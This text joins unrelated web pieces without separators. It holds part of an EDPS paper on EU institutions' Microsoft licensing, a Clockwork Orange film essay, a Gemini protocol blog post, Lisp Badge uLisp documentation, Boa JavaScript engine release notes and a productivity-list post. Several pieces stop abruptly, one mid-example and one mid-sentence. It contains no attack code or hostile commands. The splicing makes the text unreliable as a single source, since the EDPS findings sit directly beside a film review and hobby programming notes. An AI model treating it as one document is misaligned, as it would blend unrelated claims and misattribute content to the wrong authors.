<h2>EDPS Public Paper on</h2>

<p>2 July 2020</p>
<div>
<p>The European Data Protection Supervisor (EDPS) is the independent supervisory authority established by Article 52 of <a href="https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=CELEX:32018R1725&amp;from=EN">Regulation (EU) 2018/1725</a> responsible for:</p>
<ul>
<li><p>Monitoring and ensuring the application of the provisions of Regulation (EU) 2018/1725 and any other EU act relating to the protection of the fundamental rights and freedoms of natural persons with regard to the processing of personal data by a EU institution or body;</p></li>
<li><p>Advising EU institutions and bodies and data subjects on all matters concerning the processing of personal data.</p></li>
</ul>
<p>To this end, the EDPS fulfils its duties in accordance with Article 57 of Regulation (EU) 2018/1725 and exercises the powers granted in Article 58 of Regulation (EU) 2018/1725.</p>
<p>The power to investigate is one of the tools established to monitor and ensure compliance with Regulation (EU) 2018/1725.</p>
</div>
<div>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. These findings and recommendations from the investigation are likely to be of wider interest than just of the EU institutions: they may be of particular interest to all public authorities in EU/EEA Member States.</p>
<p>The EDPS assessed the compliance of the licensing agreement between Microsoft and the EU institutions against the requirements laid down in Regulation (EU) 2018/1725<span data-cites="regulation20181725"><a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></span> which sets out the rules for data protection in the EU institutions, bodies, offices and agencies as well as the duties and powers of the European Data Protection Supervisor (EDPS).</p>
<p>In the interest of a coherent approach to personal data protection throughout the Union, and the free movement of personal data within the Union, the legislators aligned Regulation (EU) 2018/1725 as far as possible with the data protection rules of Regulation (EU) 2016/679<span data-cites="gdpr"><a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a></span> (‘General Data Protection Regulation’ - GDPR). Whenever the provisions of Regulation (EU 2018/1725 follow the same principles as the provisions of the GDPR, these two sets of provisions should, under the case law of the Court of Justice of the European Union be interpreted homogeneously, in particular because the scheme of this Regulation should be understood as equivalent to the scheme of the GDPR.</p>
<p>The EDPS made the following key findings in its investigation into the EU institutions’ use of Microsoft products and services.</p>
<p>First, the licensing agreement between Microsoft and the EU institutions allowed Microsoft to define and change the parameters of its processing activities carried out on behalf of EU institutions and contractual data protection obligations. The discretion that Microsoft had, amounted to a broad right for Microsoft to act as a controller. Given the EU institutions’ role as public service institutions, the EDPS did not consider this appropriate. The EDPS recommended to EU institutions that they act to retain controllership.</p>
<p>Second, EU institutions needed to put in place a comprehensive and compliant controller-processor agreement and documented instructions of the EU institutions to the processors. Their lack of control over which sub-processors Microsoft used and lack of meaningful audit rights also presented significant issues. The EDPS made recommendations on how to improve the controller-processor agreement and put robust audit checks in place.</p>
<p>Third, EU institutions faced a number of linked issues concerning data location, international transfers and the risk of unlawful disclosure of data. They were unable to control the location of a large portion of the data processed by Microsoft. Nor did they properly control what was transferred out of the EU/EEA and how. There was also a lack of proper safeguards to protect data that left the EU/EEA. EU institutions also had few guarantees at their disposal to defend their privileges and immunities and ensure that Microsoft would only disclose personal data insofar as permitted by EU law. The EDPS made recommendations to assist EU institutions in addressing these issues.</p>
<p>Fourth, the EDPS considered the technical measures that the Commission had put in place to stem the flow of personal data generated by Microsoft products and services and sent to Microsoft. The EDPS recommended that all EU institutions perform tests using a revised and comprehensive approach, share among them the knowledge and technical solutions they developed to prevent unauthorised data flows to Microsoft and inform each other of any data protection issues they identify with the products or services.</p>
<p>Fifth, the EU institutions had insufficient clarity as to the nature, scope and purposes of the processing and the risks to data subjects to be able to meet their transparency obligations towards data subjects. The EDPS recommended that EU institutions seek the clarity and assurances allowing them to keep data subjects properly informed.</p>

<h2 data-number="1.1" id="context"> Context</h2>
<p>This paper presents the issues raised by the EDPS’ own-initiative investigation into European institutions’, bodies’, offices’ and agencies’ (‘EU institutions’) use of Microsoft products and services. It presents the EDPS’ findings and recommendations from the investigation to be shared with a wider audience, applying a high standard of transparency<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a>, while preserving the necessary confidentiality of certain elements of the EU institutions’ contract and of the EDPS’ investigation.</p>
<p>A large amount of personal data is processed through the EU institutions’ use of Microsoft products and services. Over 45&nbsp;000 staff of EU institutions, including the EDPS, are users of those products and services. In addition, staff use Microsoft products and services to process the personal data of people who are not staff.</p>
<p>The EDPS’ investigation focused on the terms of the <em>Inter-Institutional Licensing Agreement</em> (‘ILA’) that EU institutions signed with Microsoft in 2018. The EDPS also considered the technical measures that the European Commission, as the largest EU institution with a great variety of tasks, had implemented affecting the flow of personal data to Microsoft.</p>
<p>The EDPS issued its findings and recommendations to the EU institutions upon the closure of its investigation in March 2020. The purpose of the EDPS’ report was to provide EU institutions with forward-looking assistance in bringing their arrangements into compliance with data protection law. In particular, the EDPS’ findings and recommendations were oriented towards supporting the renegotiation of the ILA and EU institutions’ contract and implementation of robust technical and organisational measures that should accompany the contract.</p>
<p>EU institutions’ processing of personal data and the EDPS’ own supervisory and investigative powers are governed by Regulation (EU) 2018/1725.<span data-cites="regulation20181725"><a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a></span> The EDPS assessed the compliance of the ILA against the requirements laid down in that regulation. Although Regulation (EU) 2018/1725 is a data protection regime that is tailored to the EU institutions and distinct from the better-known General Data Protection Regulation<span data-cites="gdpr"><a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a></span> (‘GDPR’), the overlap between the provisions of Regulation (EU) 2018/1725 and those of the GDPR is extensive.</p>
<p>As a consequence, the EDPS’ findings and recommendations are likely to be of wider interest than to EU institutions.<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a> Not only is the law the EDPS applied in its investigation based on the same principles and shares the vast majority of provisions with the GDPR, but the agreement signed by EU institutions is based on standard Microsoft volume-licensing documents and therefore likely to bear similarities to agreements concluded by other organisations. The EDPS’ findings and recommendations may be of particular interest to public authorities in EU member states.</p>
<p>They are also likely to be of relevance beyond the conclusion and implementation of volume licensing agreements for Microsoft products and services. In the EDPS’ view, organisations outsourcing provision or operation of digital services from other service providers are likely to come across similar issues.</p>
<h2 data-number="1.2" id="general-recommendations"> General recommendations</h2>
<p>The EDPS recommended that EU institutions carefully consider any purchases of Microsoft products and services or new uses of existing products and services until after they have analysed and implemented the recommendations of the EDPS. They should involve their Data Protection Officers when deciding how to implement the recommendations of the EDPS. The EU institutions should properly embed data protection in each specific public information and communications technology procurement procedure, specifying the security and data protection measures to be implemented in respect of the particular products and services that are being procured.</p>
<p>This will help EU institutions, from the start, to procure products and services with appropriate contractual and other organisational measures, technical and security measures so that the processing of personal data through those tools complies with Regulation (EU) 2018/1725, in particular with the principle of data protection by design and by default.<span data-cites="regulation20181725"><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a></span></p>

            <p><em>This week's Viewer film essay: on Stanley Kubrick’s A Classic Orange. What kinds of writing would you like to see from the Viewer? All suggestions much appreciated. Let us know at <a href="mailto:editors@theviewer.is">editors@theviewer.is</a></em></p><hr><p><em>Spoilers Ahead (and for Taxi Driver, Parasite, and Barry Lyndon), and ultraviolence throughout.</em></p><p>Here is a typical character arc: the main character has a problem. They are living life in a self-perpetuating stasis, in need of change. An inciting event comes along to break that stasis, and they are forced to undergo a journey that spits them out as a better person.</p><p>This is a truncated version of Joseph Campbell’s cherished Monomyth, and most stories follow it in some way or other. I’ll call it the Change arc. Stanley Kubrick’s “A Clockwork Orange” follows a much less common pattern: the Repetition arc.</p><figure><img src="https://lh3.googleusercontent.com/HQv_8xSVpcFKDrzqDNxJgvsS8JPqIMbZnzabr8913uvu-NymSz4E-cPRN7WhQQXgmkiWHTf8WK9hP_scbHdyj9kuqw80Okk5XQnHyXF-1s_GDgZ3lpug_UyYSTvShHi2kJ3419hVaTGlRV2iLQ" alt=""></figure><p>The first two stages of the Repetition arc are identical to the Change arc. The hero of “A Clockwork Orange,” Alex DeLarge, is a young hooligan who wanders a futuristic Britain with his street gang the “droogs”, raping, assaulting and defacing everyone and everything that comes in their path. Here we certainly are presented with a problematic, self-perpetuating stasis. One night, during a break-in, Alex is arrested – our inciting event. Over the next few years in prison, he is institutionalized and put through an experimental indoctrination program known as the Ludovico technique, all in a bid to rehabilitate him. This portion of the film serves as his journey, his struggle to become better.</p><p>The treatment initially seems to work – it conditions Alex’s mind to react negatively to sex and violence. He is released back onto the streets. And yet the film doesn’t end with Alex having changed or become a better person – in the last scene, he finds he has lost his aversion to sex and violence and begins once again to experience vulgar sexual fantasies. “I was cured, all right!” he quips. He has returned to his first act stasis; after all his narrative trials and tribulations, nothing has really changed.</p><p>The Repetition arc has been used in many great films. “Taxi Driver” is the story of a disturbed loner who struggles to become better, ending up showered in public praise but just as disturbed as he always was. Bong Joon Ho’s recent critical darling “Parasite” is about a family that strives to be rich and never succeeds; a socio-economic twist on the Repetition arc. Kubrick himself would return to it with the underrated “Barry Lyndon,” the tale of an Irish rogue who tries to deceive his way into a fortune, but ends up alone, crippled and destitute, all of his ambitions having disintegrated.</p><p>The Repetition arc is essentially a pessimistic one. It tells the audience that things never change, that people live in hopeless cycles predetermined by their own characters and that their struggles to achieve moral betterment or success will inevitably collapse in on themselves. One might think that the Repetition arc would be narratively unsatisfying, because it fails to transport the audience. They don’t learn anything from the story. This isn’t the only kind of storytelling technique, though. If done right, symmetry and repetition can be just as narratively cathartic as growth. There is a powerful unity to a story that is bookended by identical scenes and sentiments, a sense of overarching stasis that is almost comforting in its nihilism.</p><p>We know that the Repetition arc is important to Stanley Kubrick’s film, because in the book upon which it is based, Alex <em>does </em>change. Anthony Burgess’ 1962 novel ends with Alex growing discontent with the criminal life and becoming a productive and happy member of society. Surprisingly, his original story is the Change arc incarnate. American publishers insisted on cutting the final chapter so the novel would end on a darker note, lopping off the Change and replacing it with Repetition. Burgess reluctantly agreed, although he called the American version “badly flawed.” When he was adapting the book for the screen, Kubrick opted for the American ending, going so far as to say that he never even considered including that final, redemptive chapter.</p><p>What does the Repetition arc signify in the story of “A Clockwork Orange”?</p><p>Well, both the Repetition and the Change arc start with a problem that the protagonist faces. Alex’s problem is that he is a bad person. He’s bad not because he is misguided, or depressed, or self-centered, or angry, or pretentious, or lazy – he’s simply <em>evil. </em>Burgess, Kubrick and McDowell crafted an amoral man, a man whose entire life is built around delighting in the pain of others. Early in the film, Alex and his droogs pass a homeless man who begs them for money. Cackling, they mercilessly beat him unconscious with their batons.</p><figure><img src="https://lh6.googleusercontent.com/XF63e4X5Q8XUOJm-0coaJNAcaptigvBj82O-Nw055wASuE10JyQgjITik5mxSXmh2SwyrGvfY6dYcaRePH4MweAS1tbw5FRlZxaiuYOUKNH910krDdci7hYShTRQJw9tjVzxrfa7rCDf58MrVA" alt=""></figure><p>The first act of the movie is almost entirely devoted to showing how bad Alex is. One might assume that Kubrick is trying, with these horrific scenes, to distance the audience from Alex, to cut off any possible empathy we might feel for him – but Kubrick said, “Alex symbolizes man in his natural state, the way he would be if society did not impose its ‘civilizing’ processes upon him. What we respond to subconsciously is Alex’s guiltless sense of freedom to kill and rape, and to be our savage natural selves, and it is in this glimpse of the true nature of man that the power of the story derives.” Kubrick wants us to experience Alex’s actions as evil, yes, but also as <em>free</em> – there is a kind of wild, barbaric joy in his ability to act badly and remain unpunished.</p><p>This freedom makes Alex’s eventual arrest and his tortuous imprisonment feel unbearably oppressive. The brand of re-education that he is subjected to is inherently futile – from the government’s perspective, it is a process of rehabilitating and morally improving a delinquent member of society. From our perspective, it is the equivalent of chaining a grizzly bear to a seat and trying to teach it advanced calculus. Although the “Ludovico technique” may subdue and sterilize Alex’s savage character, it can never make him good. Socrates emphasized in several Platonic dialogues that you cannot force someone else to have knowledge. Virtue is an intentional, personal state of the soul. The government has two choices; restrict Alex’s freedom, in which case he is little more than a robot, or let him exercise it, in which case he will leave a trail of destruction and cruelty in his wake.</p><p>The “journey” towards goodness that Alex experiences is a regression, rather than a progression. Thus, the second act of the Repetition arc is not the same as the second act of a Change arc – this journey is pointless from its inception. The Repetition arc mitigates the shock of its seemingly unresolved ending because the journey that fails to succeed was doomed from the very start. It is also important that Alex’s journey is not voluntary – it is quite literally forced upon him (a fact which is shockingly visualized in the infamous Ludovico scene). In this way, “A Clockwork Orange” is a variation on the traditional Repetition arc, replacing a failed personal struggle with a failed attempt at outward rehabilitation. It says that our personal efforts at development may be doomed, but prisons and indoctrination programs are no better.</p><figure><img src="https://lh6.googleusercontent.com/fpcF7mRsmJU56-vjE-73YSXZZSF_1fPFzNPZIp6dtD8ffp7Vkh397PZ7VlRkv2D_XlY6wVxkbJpVPkXOk2v9zfRLLtTG5ERWkkVH6vocGBqz3mXBzfDSMRCFUnIhrkRR0fL4iBVjA48rtt5Kig" alt=""></figure><p>Perhaps, then, the point of the Repetition arc in “A Clockwork Orange” is as simple as this; a bad man cannot be made good. Alex has a problem, a problem that is unacceptable in its natural state – for the writer whom Alex and his droogs cripple, or the writer's wife, whom they gang-rape, or the cat-lady Alex bludgeons in her own home – yet the Ludovico technique is just as hopeless. Alex’s rotten soul sits festering at the ideological center of the film, like a tumor for which scientists have no cure. Kubrick eschews Burgess’s more positive outlook, sending a message about human nature so cynical that the Repetition arc is the only acceptable mode of expression.</p><p>Back to that enigmatic ending. Alex sits in a hospital bed. The adoring press crowd around, snapping photos of him. The media is choosing to portray him as a victim of terrible state oppression – as we explore his sick imagination in those final moments, we recognize that this “victim” is not so innocent and never has been. The one thing that could have changed Alex would be a genuine attempt on his part to improve his soul, but from that opening shot of Alex staring malignantly into the camera, we know that he doesn’t have that in him. From the crooked timber of humanity, nothing can be made straight.</p><figure><img src="https://lh3.googleusercontent.com/vDLw5d872mwsvOypY0WP8HhIPAAR23gJf-Z7EmattuFHNJigIjaM-bVZPsJKdMFGsuZPaaA7vwb2rdgBEM5308qZe4J9P8vwdOwKLUcrW7yQW9tgsary_p2FuX2VvWZ7yo60N7G_RMikubyiLQ" alt=""></figure>

<article>

<p>Published on <b>2020-06-18</b></p>
<p>I have really come to hate the World Wide Web. It is bloated at every level! Websites themselves are doubling in size at an alarming rate. The web standards are expanding at an alarming rate. Trying to build a web browser that works with the modern web from scratch, would take the manpower equivalent to the Snowy Mountains Scheme or the Manhattan Project (no hyperbole).</p>
<p>The state of the web has lead me to only one conclusion: It is broken beyond repair.</p>
<p>I don't think the web can replaced, but we can still look for simpler (open standards) alternatives to move our works to. Gemini is one of these alternatives that I have taken interest in recently. A fairly recent protocol, created in 2019, Gemini defines a markdown-inspired document format, and it's own protocol to serve these documents, or other files.</p>
<p>If you a looking for a 1:1 clone for the early web, you will probably be disappointed. Gemini takes way more design hints from <a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">Gopher</a> then it ever will from the web. Gopher (widely considered a predecessor to the web) is built on the idea of text only documents. Gemini expands on this idea by offering basic formatting, and fixing drawbacks unaccounted for in the original Gopher protocol.</p>
<p>Gemini shys away from many standard features of the web. Although there may be plenty of benefits that one accustomed to web wouldn't be able to identify. For example the lack of styling sheets may mean that Gemini sites look plain, however this allows your readers to decide on a colour scheme which suits them best. A night reader would prefer a dark theme, someone with a vision impairment will prefer high contrast, the list goes on.</p>
<p>Gemini offers no in-line image support no client-side scripting (such as Javascript). But server-side scripting (CGI) can work, so you could expect Gemini to be a valid interface for some online services.</p>
<p>The Gemini transport protocol is unsuitable for the transfer of large files, since it misses many features that protocols such as FTP or HTTP use to recover from network instability.</p>
<p>The internet protocols of old aren't encrypted by default, since security wasn't seen as being important back in the late-80's/early-90's. Thankfully Gemini, being a recent protocol, mandates the use of TLS. There is no unencrypted version of Gemini available.</p>
<p>I could totally see Gemini being used as an alternative particularly for the non-commercial individuals who use text as a primary medium. Blogs, poems, recipes, tutorials are perfect for the Gemini format. There are always ways around the lack of media functionality, since although Gemini lacks in-line images, you can still use in-line links to images. As time goes on I could imagine some Gemini browsers providing a fancy image viewer for links to images.</p>
<p>Now, what does Gemini currently have to offer? The best way to find out is to head over to the official site: <code>gemini.circumlunar.space</code> in your Gemini browser. Here you can find two search engines dedicated to finding pages based on what you search for. And two aggregators which acts as a news feed of Gemini posts.</p>
<p>Personally I enjoy scrolling through the aggregators and seeing what people are blogging about, I find interesting stuff frequently.</p>
<p>From a server management perspective, Gemini is just a diet-Web. You buy a domain name (using the web), obtain or rent a server, install a Gemini server, and start serving your site. In order to post to Gemini you either need to self-host, or take advantage of Gemini hosting which is currently on offer by circumlunar.space. No fancy P2P or Blockchain solution here, just a good old client/server model.</p>
<p>I will no doubt keep an eye on Gemini, and serving my blog posts to Gemini should be easy since they are already in markdown. No promises yet though.</p>
<p>I will leave you with the following quote and some interesting links I found.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>
<h3><span>Specification</span></h3>
<p><strong>Size:</strong> 107mm x 61mm (4.2" x 2.4").</p>
<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>
<h4><strong>Language</strong></h4>
<p>uLisp, a subset of Common Lisp, with 122 Lisp functions and special forms. For a full definition see <a href="http://www.ulisp.com/show?3L" target="_blank">uLisp Language Reference</a>.</p>
<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
<p>The following example plots the voltages on the analogue inputs 0 to 3 once a second on a single plot. First define:</p>
<pre>(defun adc (n) (lambda (x) (delay 250) (/ (analogread n) 8)))</pre>
<p>Then give the command:</p>
<pre>(plot 0 0 (adc 0) (adc 1) (adc 2) (adc 3))</pre>
<h3>plot3d&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot3d&nbsp;[<em>x-intercept y-intercept</em>] [<em>function</em>])</code></p>
<p>The function should be a function of two parameters, the x and y coordinates, and it will be called with each value of x from 0 to 255 and y from 0 to 63. The function should return the greyscale value to be plotted, from 0 to 15.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun p (x y) 
  (let ((a (/ (- x 128) 2))
        (b (- y 32))) 
    (min (abs (- (logand (/ (+ (* a a) (* b b) (* a b)) 16) 31) 15)) 15)))</pre>
<p>the following command:</p>
<pre>(plot3d 128 32 p)</pre>
<p>will plot:</p>

  <article>
    <p>Hello World!</p>

<p>Boa is an experimental Javascript lexer, parser and compiler written in Rust. It has support for some of the language, can be embedded in Rust projects fairly easily and also used from the command line.<br>
Boa also exists to serve as a Rust implementation of the EcmaScript specification, there will be areas where we can utilise Rust and its fantastic ecosystem to make a fast, concurrent and safe engine.</p>

<p>Today we’re pleased to announce our latest release, version 0.9.<br>
v0.9 is by far the biggest release we’ve had since Boa began. You can find the full changes from the <a href="https://github.com/boa-dev/boa/blob/master/CHANGELOG.md#-090-2020-06-25---move-to-organisation-78-faster-execution-time">changelog</a>. The milestone behind this version was further optimisation and an increase in new features. We can show you how we can identify areas that can be optimised.</p>



<p>Boa became the first Rust project to make use of <a href="https://github.com/rust-lang/measureme">measureme</a>, a profiling tool built from the ground up for Rust. This was only used by the Rust team themselves to profile the compiler. We managed to work with the compiler team to get the framework in a good enough state to be used by other projects too, and in this release, we gave it a try.</p>

<p>Measure me lets you profile various areas of your choosing, then you can generate a trace file which can be loaded into Chromium or various other tools for analysis.
We took it for a spin (which you’ll see in Object Specialization).</p>

<p>Below is an example of our trace, this is using a measureme tool called <code>summarize</code></p>

<p>You can read more about Rust’s usage of measureme <a href="https://blog.rust-lang.org/inside-rust/2020/02/25/intro-rustc-self-profile.html">here</a>.</p>

<h2 id="object-specialization">Object Specialization</h2>

<p>In JavaScript internal metadata for objects are stored in <code>internal slots</code>. In Boa we stored internal slots as a hashmap tied to the object, with the keys being strings and the values as <a href="https://github.com/boa-dev/boa/blob/73f65f7800917c92f86134eaa21751c1ca93d986/boa/src/builtins/value/mod.rs#L57-L78"><code>JSValues</code></a>. This meant we needed to constantly unwrap them into a Rust primitive to access the data. Secondly we were restricted as to what type of data we could put in internal slots. For example, lets say we want to implement <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set"><code>Set</code></a> by using the native <a href="https://doc.rust-lang.org/std/collections/struct.HashSet.html"><code>HashSet</code></a> as a backing store, this would not be possible.</p>

<p>By changing how internal data is handled for some of our builtin objects and removing a whole bunch of redundant access checks, we managed to speed up the interpreter.</p>

<p>Boa would spend a significant amount of time converting back and forth between JS Values and primitive values. We found a huge amount of time was spent in <code>Value::set_field</code> before any code had even been executed. <code>set_field</code> was slow due to the amount of updating of internal slots as part of setting up. Here you can see realm creation takes roughly 60ms (dev build).</p>

<p><em>We use <a href="https://github.com/rust-lang/measureme/blob/master/crox/Readme.md">Crox</a> to convert our measureme data into a format Chrome’s performance tab understands</em></p>

<p><img src="https://boa-dev.github.io/images/2020-07-03/before.png" alt="Before"></p>

<p>We refactored many builtins to hold an <code>ObjectData</code> enum variant instead, some of which can hold a value for the type also.
This can be used to both identify objects and to use their internal data.<br>
Here is an example of our enum.</p>

<div><div><pre><code><span>/// Defines the different types of objects.</span>
<span>#[derive(Debug,</span> <span>Trace,</span> <span>Finalize,</span> <span>Clone)]</span>
<span>pub</span> <span>enum</span> <span>ObjectData</span> <span>{</span>
    <span>Array</span><span>,</span>
    <span>BigInt</span><span>(</span><span>RcBigInt</span><span>),</span>
    <span>Boolean</span><span>(</span><span>bool</span><span>),</span>
    <span>Function</span><span>(</span><span>Function</span><span>),</span>
    <span>String</span><span>(</span><span>RcString</span><span>),</span>
    <span>Number</span><span>(</span><span>f64</span><span>),</span>
    <span>Symbol</span><span>(</span><span>RcSymbol</span><span>),</span>
    <span>Error</span><span>,</span>
    <span>Ordinary</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p><img src="https://boa-dev.github.io/images/2020-07-03/after.png" alt="After"></p>

<p>This gave us a 70% speedup and reduced startup time by well over half. The <code>realm::create</code> function now runs in 13ms instead of 60ms.</p>

<h2 id="optimised-type-comparisons">Optimised Type Comparisons</h2>

<p>If you’ve ever called <code>typeof</code> in JavaScript, you get a string value describing the primitive type of it’s argument. Boa was doing the same internally for comparing (using the “get_type()” call), however getting the string value from each primitive then comparing them is not very performant.<br>
Now, thanks to @Lan2u we have a rust <a href="https://github.com/boa-dev/boa/blob/8f8498eac17164c8de2f599bd0b7ba2e8053ec30/boa/src/builtins/value/val_type.rs#L4-L17"><code>Type</code></a> enum which makes comparing more efficient and on average brings another 8% performance boost.</p>

<h2 id="jsvalue-refactor">JSValue Refactor</h2>

<p>We have completely refactored how JavaScript values are stored.<br>
<a href="https://github.com/boa-dev/boa/pull/498">#498</a> makes values more lightweight by only GC’ing objects and not the primitives. The primitive scalar values are just Rust primitives which implement the Copy trait, so the overhead of moving these around is much lower.<br>
By decoupling our <code>Value</code> types and <code>GC</code> types we have brought our <code>Value</code> size from 40 bytes =&gt; 24 bytes and an 80% reduction in arithmetic operations!</p>

<h2 id="parser-rebuild-better-code-organisation">Parser rebuild, better code organisation</h2>

<p>Boa was predominantly 3 files. The lexer, parser and interpreter.<br>
The naive implementation of the parser was a <a href="https://github.com/boa-dev/boa/blob/c23a7b1f4ac57af6c5f0b9f6c98fbbed7a14c98f/src/lib/syntax/parser.rs">single file</a> which had a long match expression for tokens and went through every token figuring out what to do. This did the job but became unmaintainable when adding new features.<br>
We have been breaking the parser up into separate modules, which represent various expressions and statements that conform to the specification. (more about this in a future post).</p>

<p>After all the fixes in this release we’ve seen on average a 70% improvement, we still have areas where we plan to improve. We are currently rebuilding the lexer so it is more broken up like the parser and interpreter, we will blog about this soon in future.</p>

<h2 id="roadmap">Roadmap</h2>

<h3 id="how-much-of-the-specification-is-covered"><em>How much of the specification is covered?</em></h3>

<p>Our next milestone is to tidy up the lexer so it takes into account <a href="https://tc39.es/ecma262/#sec-context-free-grammars"><code>goal symbols</code></a> then we plan to start running Test 262, the official ECMAScript Test Suite. It has a lot of tests (over 29272 test files) and will tell us in detail which parts of the specification need work.<br>
There are also large items like classes which are still not covered, however, these should now be easier to implement with parsing broken up.</p>

<h3 id="public-api"><em>Public API</em></h3>

<p><a href="https://github.com/boa-dev/boa/issues/445">#445</a> looks to improve the public API too so Rust projects can interactive with Boa more easily.<br>
It should be possible today to just use the lexer, parser or the whole execution path.</p>

<p>We hope to add more detail in future on how some parts of Boa work, make sure you stay tuned for any future posts!</p>

                        <p>Ironically I'm writing this post as procrastiwork, since I don't feel like doing anything that's actually <em>on</em> my to-do list.</p><p>The template will probably seem obvious, but that's kinda the point. You don't need any fancy programs —&nbsp;currently I use Apple Notes; previously Google Docs. Nor do you need to read any books about productivity.</p><p>Of course, if kanban or whatever the kids are into these days is what works for you, then do that! I've learned that I won't stick with any system that isn't exactly this basic and flexible. Something like <a href="https://fortelabs.co/blog/para/">Tiago Forte's PARA</a> is amazing, but too much for me to handle.</p><p>Anyway, the template has three main sections: Now, Soon, and Later. The exact labels can and should change — I usually do something along the lines of Today, Next Few Weeks, and To-Be-Scheduled. Currently what I've got on deck is Today plus two Later sections:</p><figure><img src="https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png" alt="" srcset="https://www.sonyasupposedly.com/content/images/size/w600/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 600w, https://www.sonyasupposedly.com/content/images/2020/07/Screen-Shot-2020-07-03-at-4.43.23-PM.png 838w" sizes="(min-width: 720px) 720px"><figcaption>Sorry for the messy redaction. Btw, I don't promise to do exactly these things in exactly this order.</figcaption></figure><p>I also stick a monthly log on the end, honestly more for the satisfaction of collecting done items than anything else.</p><p>Usually I have way more Later to deal with — when tasks start to pile up I'll make a separate project-specific list, or a standalone To-Be-Scheduled list, and then get rid of it again once I've worked through the backlog.</p><p>That should give you the idea 😊 Like I said, 